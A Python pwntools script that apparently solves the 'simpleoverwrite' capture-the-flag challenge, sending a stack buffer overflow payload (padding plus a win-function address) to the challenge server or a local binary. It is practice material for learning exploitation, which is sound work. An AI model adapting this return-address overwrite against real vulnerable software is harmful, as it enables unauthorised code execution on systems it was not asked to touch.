#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("simpleoverwrite.beginners.seccon.games", 9001)

    return r


def main():

    addr_win = p64(0x401187)
    rbp = p64(0x7fffffffdcc0)
    r = conn()
    payload = b"a" * 18 + addr_win
    r.sendlineafter(b"input:", payload)
    info(r.recv(2048))


if __name__ == "__main__":
    main()
